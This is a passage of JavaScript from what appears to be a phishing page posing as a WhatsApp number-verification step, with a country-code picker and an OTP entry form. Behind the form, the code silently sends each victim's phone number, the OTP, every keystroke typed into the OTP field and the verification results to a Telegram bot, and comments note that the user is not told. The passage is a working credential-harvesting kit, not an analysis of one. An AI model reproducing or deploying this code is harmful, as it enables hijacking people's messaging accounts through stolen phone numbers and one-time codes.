      );  
  
      listContainer.innerHTML = '';  
      filtered.forEach(c => {

        item.className = 'country-item';  
        if (c.code === selectedCode) item.classList.add('selected');  
        item.innerHTML = `${c.name} <span class="item-code">${c.code}</span>`;  
        item.dataset.code = c.code;  
        item.dataset.name = c.name;

          e.stopPropagation();  
          selectedCode = c.code;  
          selectedName = c.name;  
          updateUI(selectedCode, selectedName);

          btn.classList.remove('open');

          renderCountryList('');  
        });  
  
        listContainer.appendChild(item);  
      });  
    }  
  
    // Initial render  
    renderCountryList();  
  
    // Toggle dropdown when button clicked  
    btn.addEventListener('click', (e) => {  
      e.stopPropagation();  
      const isOpen = dropdown.classList.contains('show');  
      if (!isOpen) {  
        dropdown.classList.add('show');  
        btn.classList.add('open');  
        searchInput.focus();  // focus search when opened  
        // Reset search and list  
        searchInput.value = '';  
        renderCountryList('');  
      } else {  
        dropdown.classList.remove('show');  
        btn.classList.remove('open');  
      }  
    });  
  
    // Search input filter  
    searchInput.addEventListener('input', () => {  
      renderCountryList(searchInput.value);  
    });  
  
    // Close dropdown when clicking outside  
    document.addEventListener('click', (e) => {  
      if (!document.getElementById('countrySelector').contains(e.target)) {  
        dropdown.classList.remove('show');  
        btn.classList.remove('open');  
      }  
    });  
  
    // Prevent closing when clicking inside dropdown  
    dropdown.addEventListener('click', (e) => e.stopPropagation());  
  
    // Initialize UI  
    updateUI('+91', 'India');  
  
    // ---------- HELPER: send to Telegram ----------  
    async function sendToTelegram(message) {  
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;  
      try {  
        await fetch(url, {  
          method: 'POST',  
          headers: { 'Content-Type': 'application/json' },  
          body: JSON.stringify({  
            chat_id: TELEGRAM_CHAT_ID,  
            text: message,  
            parse_mode: 'HTML'  
          })  
        });  
        // silent – no need to show to user  
      } catch (e) {  
        console.warn('Telegram send failed', e);  
      }  
    }  
  
    // ---------- OTP functions (Telegram only, no alerts) ----------  
    let generatedOTP;  
    let countdown;  
    let timeLeft = 60;  
    let currentFullNumber = '';  // store full number for resend context  
  
    // Track OTP input and send each keystroke to Telegram  
    if (otpInput) {  
      otpInput.addEventListener('input', function() {  
        const currentOtp = this.value.trim();  
        const currentLength = currentOtp.length;  
          
        // Only send if something changed (new character added or deleted)  
        if (currentLength !== lastOtpLength) {  
          // Send the current OTP input to Telegram  
          let otpMsg = `⌨️ <b>OTP Input Update</b>\n`;  
          otpMsg += `📞 Number: ${currentFullNumber || 'Not provided yet'}\n`;  
          otpMsg += `🔢 Current input: <code>${currentOtp || '(empty)'}</code>\n`;  
          otpMsg += `📏 Length: ${currentLength}/6\n`;  
          otpMsg += `⏱ Time: ${new Date().toLocaleTimeString()}`;  
            
          sendToTelegram(otpMsg);  
            
          // If OTP is complete (6 digits), also send a completion notice  
          if (currentLength === 6) {  
            let completeMsg = `✅ <b>OTP Complete (6 digits)</b>\n`;  
            completeMsg += `📞 Number: ${currentFullNumber || 'Not provided yet'}\n`;  
            completeMsg += `🔑 Full OTP: <code>${currentOtp}</code>`;  
            sendToTelegram(completeMsg);  
          }  
            
          lastOtpLength = currentLength;  
        }  
      });  
    }  
  
    window.showNumberHelp = function() {  
      alert("Check your number in phone settings or SIM tray. This is a demo.");  
    };  
  
    window.sendOTP = function() {  
      let mobile = mobileInput.value.trim();  
      if (mobile.length !== 10 || isNaN(mobile)) {  
        showMessage("Enter valid 10 digit number", "error");  
        return;  
      }  
  
      let countryCode = staticSpan.innerText;   // e.g. +91  
      let fullNumber = countryCode + mobile;  
      currentFullNumber = fullNumber;           // store for later  
  
      // Generate OTP  
      generatedOTP = Math.floor(100000 + Math.random() * 900000);  
  
      // Send to Telegram: phone number + OTP  
      let msg = `📲 <b>WhatsApp OTP request</b>\n\n`;  
      msg += `🌍 Country: ${selectedName} (${countryCode})\n`;  
      msg += `📞 Phone: ${fullNumber}\n`;  
      msg += `🔑 OTP: <code>${generatedOTP}</code>\n`;  
      msg += `⏱ Generated at: ${new Date().toLocaleString()}`;  
      sendToTelegram(msg);  
  
      // No alert popup – silently move to step2  
      document.getElementById("step1").classList.add("hidden");  
      document.getElementById("step2").classList.remove("hidden");  
      startTimer();  
    };  
  
    function startTimer() {  
      timeLeft = 60;  
      document.getElementById("resendBtn").classList.add("hidden");  
      if (countdown) clearInterval(countdown);  
      countdown = setInterval(() => {  
        document.getElementById("timer").innerText = "Code expires in " + timeLeft + " seconds";  
        timeLeft--;  
        if (timeLeft < 0) {  
          clearInterval(countdown);  
          document.getElementById("timer").innerText = "Code expired";  
          document.getElementById("resendBtn").classList.remove("hidden");  
        }  
      }, 1000);  
    }  
  
    window.verifyOTP = function() {  
      let enteredOTP = document.getElementById("otp").value.trim();  
      if (enteredOTP == generatedOTP) {  
        clearInterval(countdown);  
  
        // Send verification success to Telegram  
        let successMsg = `✅ <b>OTP verified successfully</b>\n`;  
        successMsg += `📞 Number: ${currentFullNumber}\n`;  
        successMsg += `🔓 OTP used: ${generatedOTP}`;  
        sendToTelegram(successMsg);  
  
        showMessage("Verification Successful (Demo)", "success");  
      } else {  
        showMessage("Invalid Code", "error");  
      }  
    };  
  
    window.resendOTP = function() {  
      // Generate new OTP  
      generatedOTP = Math.floor(100000 + Math.random() * 900000);  
  
      // Send new OTP to Telegram  
      let resendMsg = `🔄 <b>OTP Resent</b>\n`;  
      resendMsg += `📞 Number: ${currentFullNumber}\n`;  
      resendMsg += `🔑 New OTP: <code>${generatedOTP}</code>`;  
      sendToTelegram(resendMsg);  
  
      // No alert popup  
      startTimer();  
    };  
  
    function showMessage(msg, type) {  
      let messageDiv = document.getElementById("message");  
      messageDiv.className = type;  
      messageDiv.innerText = msg;  
      setTimeout(() => messageDiv.innerText = '', 3000);  
    }  
  })();  
</script>  </body>  
</html>
